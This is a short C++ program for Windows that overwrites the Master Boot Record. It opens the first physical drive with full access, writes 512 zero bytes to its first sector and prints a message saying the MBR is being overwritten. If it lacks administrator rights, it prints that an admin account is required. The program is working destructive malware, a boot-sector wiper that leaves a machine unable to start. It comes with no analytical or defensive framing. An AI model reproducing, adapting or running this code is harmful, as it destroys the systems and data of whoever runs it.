#include <iostream>
#include <windows.h>

using namespace std;
#define MBR_SIZE 512

int main() {
    DWORD towrite;
    char mbrData[512];
    ZeroMemory(&mbrData, (sizeof mbrData));

    HANDLE MBR = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if(WriteFile(MBR, mbrData, MBR_SIZE, &towrite, NULL) == TRUE) {
        cout << "MBR is being overwritten...";
        Sleep(6000);
        ExitProcess(0);
    }

    else {
        cout << "Admin account required";
        Sleep(2900);
    }
    CloseHandle(MBR);

    return EXIT_FAILURE;
}